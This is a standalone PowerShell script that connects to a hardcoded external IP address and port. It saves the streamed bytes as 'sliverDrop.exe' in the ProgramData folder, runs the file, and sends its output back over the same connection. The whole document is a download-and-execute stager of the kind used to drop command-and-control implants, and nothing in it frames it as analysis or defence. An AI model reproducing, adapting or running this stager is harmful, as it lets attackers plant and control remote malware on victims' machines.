$socket = New-Object System.Net.Sockets.TcpClient('52.152.174.80', 8181)

if ($socket -eq $null) {
    exit 1
}

$stream = $socket.GetStream()
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.AsciiEncoding

# Specify the target directory
$targetDirectory = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('CommonApplicationData'), 'DownloadedFiles')

# Create the target directory if it doesn't exist
if (-not (Test-Path -Path $targetDirectory -PathType Container)) {
    New-Item -Path $targetDirectory -ItemType Directory
}

# Determine the file name (e.g., sliverDrop.exe)
$receivedFile = [System.IO.Path]::Combine($targetDirectory, 'sliverDrop.exe')

$fs = [System.IO.File]::Create($receivedFile)

while ($stream.DataAvailable) {
    $read = $stream.Read($buffer, 0, 1024)
    $fs.Write($buffer, 0, $read)
}

$fs.Close()

# Execute the downloaded executable
$pinfo = New-Object System.Diagnostics.ProcessStartInfo
$pinfo.FileName = $receivedFile
$pinfo.RedirectStandardError = $true
$pinfo.RedirectStandardOutput = $true
$pinfo.UseShellExecute = $false

$p = New-Object System.Diagnostics.Process
$p.StartInfo = $pinfo
$p.Start() | Out-Null
$p.WaitForExit()
$stdout = $p.StandardOutput.ReadToEnd()
$stderr = $p.StandardError.ReadToEnd()

if ($p.ExitCode -ne 0) {
    $res = $stderr
} else {
    $res = $stdout
}

# Send the output of the executed file back to the server
$writer = New-Object System.IO.StreamWriter($stream)
$writer.WriteLine($res)
$writer.Close()

$socket.Close()
$stream.Dispose()
